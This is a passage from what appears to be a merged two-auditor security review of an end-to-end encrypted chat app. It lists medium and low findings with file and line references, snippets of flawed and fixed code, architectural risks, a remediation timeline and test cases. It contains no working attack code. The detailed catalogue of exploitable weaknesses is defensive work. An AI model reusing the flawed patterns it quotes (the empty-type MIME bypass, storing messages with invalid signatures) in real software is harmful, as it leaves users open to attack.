| U-27 | No rate limiting on HTTP REST endpoints (`/health`, `/refresh`, `/users/search`) — brute-force and enumeration | Both (AG M-1 / Codex 13 partial) | server.js | 1318–1520 |
| U-28 | Username enumeration via distinct error messages ("Username already registered" vs "Address already registered") | AG M-2 | server.js | 258–267 |
| U-29 | Unbounded `messageIds` array in `messageAck` — no length cap → expensive `ANY($2::uuid[])` SQL query | AG M-3 | server.js | 863–878 |
| U-30 | `deliverMissingMessage` allows forged `from` field in forwarded messages (distinct from U-6 authorization gap) | AG M-4 | server.js | 747–794 |
| U-31 | Push tokens partially/fully logged in server output and mock mode | AG M-5 | server.js L922, push.js L53 |
| U-32 | No address format validation on registration (inconsistent with `/users/exists/:address` HTTP endpoint which validates) | AG M-6 | server.js | 229–232 |
| U-33 | Socket callback argument injection — wrapper replaces legitimate data argument with no-op function | AG M-7 | server.js | 163–178 |
| U-34 | Mnemonic seed phrase copied to clipboard via `navigator.clipboard.writeText()` — accessible to extensions/malware/clipboard monitors | AG M-8 | App.jsx | L1104 |
| U-35 | Client-side-only username validation (HTML `pattern` attribute trivially bypassed via console/interceptor) | AG M-9 | App.jsx | L1399–1406 |
| U-36 | Unsanitized user content (usernames, error messages) in `alert()`/`confirm()` dialogs — social engineering vector | AG M-10 | App.jsx | L1981, 2049 |
| U-37 | MIME type validation bypass via empty `file.type` — `file.type && !isAllowed` evaluates to `false` | AG M-11 | App.jsx | L742 |
| U-38 | Username cache in `sessionStorage` without integrity protection — XSS can poison displayed identities | AG M-12 | DecentraChatContext.jsx | L94–107 |
| U-39 | Argon2id silently falls back to PBKDF2 (100K iterations) without user notification when WASM fails to load | AG M-13 | secureStorage.js | L130–138 |
| U-40 | `crypto-shim.js` `createCipheriv.update()` always returns empty Buffer — `Buffer.concat([update(), final()])` loses data when shim active | AG M-15 | crypto-shim.js | L221–225 |
| U-41 | Skipped message keys stored as plaintext hex in `skipped_message_keys` table — exploitable with U-19 (unencrypted SQLite) | AG crypto | cryptography.js | L372–377 |
| U-42 | X3DH uses identity keys with potential Ed25519/X25519 type confusion — may produce incorrect shared secrets | AG crypto | cryptography.js | L83–98 |
| U-43 | Legacy localStorage migration may leave plaintext key material if `saveToStorage()` fails (not removed until after save succeeds) | AG crypto | dbClient.js | L88–111 |
| U-44 | Browser DB decryption key (CryptoKey handle) stored in same IndexedDB as encrypted data — any same-origin XSS can use it | AG crypto | dbClient.js | L47–72 |
| U-45 | Global `Buffer` polyfill exposed on `window`/`globalThis` — enlarges XSS attack surface for binary manipulation | AG frontend | main.jsx | L1–3 |
| U-46 | Unvalidated backup JSON input — no schema validation, size limits, or format checking before `importBackup()` | AG frontend | App.jsx L1346, DecentraChatContext.jsx L1007 |

### Selected Medium Finding Details

**U-24 — Group Messages With Invalid Signatures Are Stored (Both auditors):**

Codex's analysis: In the group-message path, signature validation may fail but the client only prefixes the body with a warning — the message is still stored and surfaced. Possession of the group key ≠ sender authenticity.

```javascript
// Current: message displayed with prefix
bodyText = `[UNVERIFIED SENDER] ${bodyText}`;

// Should instead: reject by default
if (!signatureVerified) throw new Error("Invalid group message signature");
// Treat unsigned legacy messages as compatibility mode only if explicitly enabled
// Never process control messages from invalid signatures
```

**U-25 — Group Message Username Resolution Runtime Bug (Codex only):**
```javascript
// Current (crashes): db.prepare() called outside database callback/scope
const row = db.prepare('SELECT id FROM conversations WHERE ...');

// Fixed:
const row = await this.db.read((db) => {
  return db.prepare('SELECT id FROM conversations WHERE LOWER(username) = ? AND is_group = 0')
    .get(resolvedFromAddress);
});
```
Impact: Group message processing failure; potential local DoS by triggering malformed/username-based group messages.

**U-26 — Privacy/Presence Leakage (Codex only):**
On login, the server returns all online users. Login and disconnect events broadcast wallet addresses. This undermines stealth-mode and hide-wallet expectations, and enables presence graph collection.

Fix: Do not return global `onlineUsers`. Scope presence to contacts/active conversations. Respect stealth mode before broadcasting. Consider presence subscriptions rather than global broadcasts.

**U-37 — MIME Type Validation Bypass (Antigravity):**
```javascript
// Current: empty type bypasses check
if (file.type && !isAllowed) { ... }  // "" && false = false → bypass

// Fixed:
if (!file.type || !isAllowed) { ... }
```

**U-39 — Argon2id Silent Fallback (Antigravity):**
If Argon2id WASM fails to load, code silently falls back to PBKDF2 with 100,000 iterations. The `kdfType` stored may still say `'argon2id'`. An attacker who forces WASM loading to fail (CSP blocking WASM, environment manipulation) downgrades all password-based encryption.

Fix: Alert user when falling back. Store actual KDF type used. Consider failing hard. Increase PBKDF2 fallback to ≥600,000 iterations.

**U-40 — crypto-shim `update()` Returns Empty Buffer (Antigravity):**
The `update()` method always returns `Buffer.alloc(0)` and accumulates internally. Callers using `Buffer.concat([cipher.update(...), cipher.final()])` (as in secureStorage.js L156) get only `final()` output. This is a correctness/data-loss bug when the shim is active (browser environment).

---

## 🟢 LOW FINDINGS (13)

| # | Finding | Found By | File | Lines |
|---|---------|----------|------|-------|
| U-47 | Synchronous file I/O (`appendFileSync`, `readFileSync`) in hot path blocks event loop under load | AG L-1 | server.js | 81, 88, 91 |
| U-48 | Raw `err.message` returned to client in `deliverMissingMessage` — leaks internal details | AG L-2 | server.js | 793 |
| U-49 | SSL disabled for database connections in non-production — Neon cloud DB accessed over cleartext | AG L-3 | db.js | 38 |
| U-50 | Biometric login enable uses `prompt()` — password displayed in plain text on screen (not maskable) | AG L-5 | App.jsx | L3425 |
| U-51 | No client-side rate-limiting on login/unlock attempts — brute-force possible with physical access | AG L-6 | App.jsx L585, Context L274 |
| U-52 | DevTools accessible via Ctrl+Shift+I in production Electron builds — allows inspection of all JS state | AG L-7 | electron/main.js | 168–172 |
| U-53 | Mnemonic entropy is 128-bit (12 words) — 256-bit (24 words) provides better long-term security margin | AG L-8 | keyDerivation.js | 40 |
| U-54 | Media ID uses `Math.random().toString(36)` — predictable, allows enumeration on relay | AG L-9 | client/src/media.js | 125 |
| U-55 | HKDF salt is static string for key derivation (`'echo-identity-salt'`) — acceptable for deterministic derivation but should be documented | AG crypto | keyDerivation.js | L57–58 |
| U-56 | No explicit constant-time comparison for auth tag verification in crypto-shim (node-forge handles internally, but should be verified) | AG crypto | crypto-shim.js | L268–270 |
| U-57 | `document.getElementById` for scroll-to-reply uses P2P-supplied message IDs — limited impact via `scrollIntoView` | AG frontend | App.jsx | L2487, 2557 |
| U-58 | `accentColor` CSS custom property injection — mitigated by hex regex validation (`/^#[0-9a-fA-F]{6}$/`) — informational | AG frontend | App.jsx | L494–496 |
| U-59 | Electron `shell.openExternal` does not validate URL protocols — allows `file:`, `javascript:`, malformed URLs | Codex 15 | electron/main.js | — |

### U-59 Detail — Electron External Link Protocol Validation (Codex only):

`setWindowOpenHandler` sends all requested URLs to `shell.openExternal` without protocol restriction.

```javascript
// Fix: whitelist protocols
const allowedProtocols = ['https:', 'mailto:'];
try {
  const url = new URL(requestedUrl);
  if (!allowedProtocols.includes(url.protocol)) {
    return { action: 'deny' };
  }
} catch {
  return { action: 'deny' }; // malformed URL
}
shell.openExternal(requestedUrl);
```
Reject `file:`, `javascript:`, unusual custom schemes, and malformed URLs.

---

## ✅ Positive Security Observations (Combined — 27)

| # | Area | Detail | Noted By |
|---|------|--------|----------|
| 1 | SQL Injection Prevention | All queries use parameterized `$1, $2...` placeholders via `pg` | Both |
| 2 | Refresh Token Storage | SHA-256 hashed, compared with `timingSafeEqual` | Both |
| 3 | Refresh Token Rotation | Old token deleted, new token issued on each refresh | Both |
| 4 | Session Limits | Max 5 refresh tokens per user enforced | Antigravity |
| 5 | Outbox Quota | FIFO eviction at 1000 messages per recipient | Antigravity |
| 6 | UUID Validation | Message IDs validated against UUID regex | Antigravity |
| 7 | Timestamp Validation | Messages rejected if timestamp desynced > 5 minutes | Antigravity |
| 8 | Username Constraints | Format validation, uniqueness check, 3 changes max, 14-day cooldown | Both |
| 9 | Profile Picture Validation | Size limit, HTTPS-only URL, data URI cap via `sanitizePfpUrl()` | Antigravity |
| 10 | No `dangerouslySetInnerHTML` | Message text rendered via React JSX text nodes (auto-escaped) | Antigravity |
| 11 | No `innerHTML` or `eval()` | No direct DOM manipulation with user content | Antigravity |
| 12 | Double Ratchet Protocol | Structurally correct — HKDF KDFs, DH ratchet, skipped key handling (100 max) | Antigravity |
| 13 | X3DH Protocol | Correct 3-DH/4-DH handshake, pre-key signature verified before session init | Both |
| 14 | AES-256-GCM | Consistent use of authenticated encryption throughout | Antigravity |
| 15 | Random IV Generation | Fresh 12-byte IVs for every encryption operation | Antigravity |
| 16 | Message Replay Protection | Duplicate ID check + 5-minute timestamp drift enforcement | Antigravity |
| 17 | Electron Isolation | `nodeIntegration: false`, `contextIsolation: true`, `contextBridge` used correctly | Both |
| 18 | Forward Secrecy | Skipped keys expire after 7 days | Antigravity |
| 19 | Express Body Limits | JSON body size limited to 16 KB for HTTP endpoints | Codex |
| 20 | Socket.IO Buffer Limit | Message buffer size limited to 512 KB | Codex |
| 21 | JWT/DB Required at Startup | Server won't start without `JWT_SECRET` and `DATABASE_URL` | Codex |
| 22 | CORS Restricted in Production | Production mode restricts origins via `ALLOWED_ORIGINS` | Codex |
| 23 | `google-services.json` Excluded | Firebase config not tracked in git | Codex |
| 24 | Password Complexity | 8+ chars, uppercase, lowercase, number enforced | Antigravity |
| 25 | File Upload Limits | 50MB size limit with MIME type allowlist | Antigravity |
| 26 | Blob URL Cleanup | `URL.revokeObjectURL` properly called on conversation change | Antigravity |
| 27 | React StrictMode | Enabled in main.jsx | Antigravity |

---

## ⚠️ Architectural / Systemic Risks (Combined)

### 1. No Trust-On-First-Use (TOFU) Key Pinning *(Antigravity)*
The app fetches identity keys from the relay server without pinning. A compromised relay could substitute keys at any time → silent MITM attack. **Undermines the entire E2E encryption model.**

**Recommendation:** Implement TOFU — store first-seen identity key per contact and alert on changes (similar to Signal's "safety numbers").

### 2. No Ratchet Session Backup/Restore *(Antigravity)*
Importing a backup restores messages but does NOT restore ratchet sessions. After import, all active E2EE sessions are broken and require re-negotiation. Users may not understand why messages stop working.

### 3. Group Key in Unencrypted Backups *(Antigravity)*
Backup export includes group keys encrypted only by the backup passphrase. Weak passphrase + leaked backup = all group history exposed.

### 4. Decryption Key Stored Alongside Encrypted Data *(Antigravity)*
The AES-GCM CryptoKey for the browser database lives in the same IndexedDB as encrypted data. `extractable: false` helps, but any same-origin code can use the key handle to decrypt. Fundamental browser limitation. Mitigate with password-derived wrapping key.

### 5. Missing-Message Recovery Design is Inherently Trust-Confused *(Codex)*
The architecture trusts the relay to route recovery requests honestly and trusts the client to re-encrypt only for authorized parties. Neither boundary is enforced. Requires a protocol-level redesign, not just point fixes.

### 6. Electron/Mobile Trust Boundaries Are Too Permissive *(Codex)*
Combined effect of `webSecurity: false`, `allowMixedContent: true`, `allowBackup: true`, broad FileProvider, and open CORS on localhost auth server means desktop and mobile trust boundaries are significantly weaker than the cryptographic layer they protect.

---

## 🗺️ Unified Remediation Roadmap

```mermaid
gantt
    title Combined Remediation Timeline
    dateFormat  YYYY-MM-DD
    section P0 — Deploy Blockers
    U-1 Rotate DB creds + JWT secret           :crit, p0a, 2026-07-10, 1d
    U-2 Remove TEST_MODE bypass                 :crit, p0b, 2026-07-10, 1d
    U-4 Remove webSecurity false + add sandbox  :crit, p0c, 2026-07-10, 1d
    U-6 Fix missing-message authorization       :crit, p0d, 2026-07-10, 2d
    section P1 — This Week
    U-3 Fix OPK rate limiting per-target        :high, p1a, 2026-07-12, 2d
    U-5 Fix biometric storage + strength        :high, p1b, 2026-07-12, 2d
    U-7 Fix Electron auth CORS + nonce          :high, p1c, 2026-07-12, 1d
    U-8 Fix Android mixed content + FileProvider:high, p1d, 2026-07-13, 1d
    U-9 Fix PoW challenge replay + binding      :high, p1e, 2026-07-13, 1d
    U-10 Update vulnerable dependencies         :high, p1f, 2026-07-14, 2d
    U-15 Reduce JWT to 15-30min + reuse detect  :high, p1g, 2026-07-12, 1d
    section P2 — Next Sprint
    U-12 Input length validation + quotas       :med, p2a, 2026-07-16, 2d
    U-16 Apply sanitizePfpUrl everywhere        :med, p2b, 2026-07-16, 1d
    U-17 Fix CSP directives                     :med, p2c, 2026-07-16, 1d
    U-18 Remove production console.log          :med, p2d, 2026-07-16, 1d
    U-19 Encrypt SQLite at rest                 :med, p2e, 2026-07-17, 3d
    U-20 Group key rotation                     :med, p2f, 2026-07-18, 5d
    U-21 Fix scrypt shim                        :med, p2g, 2026-07-17, 2d
    U-24 Reject invalid group signatures        :med, p2h, 2026-07-17, 1d
    U-26 Scope presence visibility              :med, p2i, 2026-07-18, 1d
    section P3 — Backlog
    Remaining Medium findings                   :low, p3a, 2026-07-25, 5d
    All Low findings                            :low, p3b, 2026-08-01, 3d
    TOFU key pinning                            :low, p3c, 2026-08-04, 5d
```

| Priority | Findings | Effort | Impact |
|----------|----------|--------|--------|
| 🔴 **P0 — Today** | U-1, U-2, U-4, U-6 | ~6 hours | DB takeover, auth bypass, SOP bypass, message confidentiality |
| 🟠 **P1 — This week** | U-3, U-5, U-7–U-10, U-15 | ~2 days | Crypto DoS, biometric bypass, auth forgery, dependency RCE |
| 🟡 **P2 — Next sprint** | U-11–U-14, U-16–U-22, U-24, U-26 | ~4 days | Input hardening, crypto correctness, presence privacy |
| 🟢 **P3 — Backlog** | All remaining Medium + Low + Architectural | ~3 weeks | Defense-in-depth, quality improvements |

---

## 🧪 Suggested Security Test Cases (From Codex)

### Missing-Message Recovery
- [ ] Authenticated non-member requests direct-chat message recovery → should fail
- [ ] Authenticated group non-member requests group message recovery → should fail
- [ ] Valid direct peer requests missing message → should succeed
- [ ] Valid group member requests missing group message → should succeed
- [ ] Sender client receives unauthorized `getMissingMessage` → should refuse locally

### Electron Auth
- [ ] Callback without nonce → rejected
- [ ] Callback with expired nonce → rejected
- [ ] Callback before `open-auth-browser` → rejected
- [ ] Callback body above limit → rejected
- [ ] Valid callback with matching nonce → accepted

### Mobile Storage
- [ ] App backup does not include mnemonic, biometric key, or local encrypted database
- [ ] Biometric key cannot be read from Preferences directly
- [ ] Biometric login fails after biometric enrollment changes

### Group Authentication
- [ ] Group message with invalid signature → rejected
- [ ] Group control message with invalid signature → rejected
- [ ] Message signed for different group ID → rejected
- [ ] Former member with stale group key cannot send accepted messages after rotation

### Dependency/Build
- [ ] `npm audit --omit=dev` passes for production dependencies
- [ ] Electron bundle excludes dev dependencies
- [ ] Production Android build has mixed content disabled
- [ ] Production Electron build has `webSecurity: true`

---

## Final Assessment

### Agreement & Disagreement

**Strongest agreement:** Both auditors independently flagged Electron `webSecurity: false` (U-4) and biometric storage weaknesses (U-5) as top-priority issues.

**Most significant disagreement:** The missing-message recovery flow — Codex rated it Critical (full message confidentiality breach via unauthorized recovery), while Antigravity initially rated the `deliverMissingMessage` handler as Medium (focusing on the forged `from` field). **Codex's Critical rating is the correct assessment** — the authorization gap allows exfiltration of private messages from conversations the attacker doesn't belong to.

**Most significant gap in both audits:** Neither audit performed a dedicated protocol-level review of the custom X3DH/Double Ratchet implementation against the Signal specification. Both noted it appears structurally correct, but a specialized cryptographic review is recommended before high-risk deployment.

### Coverage Confidence

| Risk Area | Audit Coverage | Confidence |
|-----------|----------------|------------|
| Server auth/authorization | ✅ Thorough (both) | High |
| Frontend DOM security | ✅ Thorough (Antigravity) | High |
| Crypto implementation | ✅ Good (Antigravity) | Medium — needs specialist |
| Electron/desktop | ✅ Thorough (both) | High |
| Android/mobile | ✅ Good (Codex) | Medium |
| Dependencies | ✅ Good (Codex) | High |
| Protocol design | ⚠️ Partial (both) | Medium — needs formal review |

### Recommended Release Posture

> [!IMPORTANT]
> **Do not ship publicly until all Critical (U-1 through U-7) and High (U-8 through U-22) findings are fixed and retested.** The four P0 items — hardcoded credentials, TEST_MODE bypass, webSecurity disable, and missing-message authorization — should be treated as immediate deploy blockers.
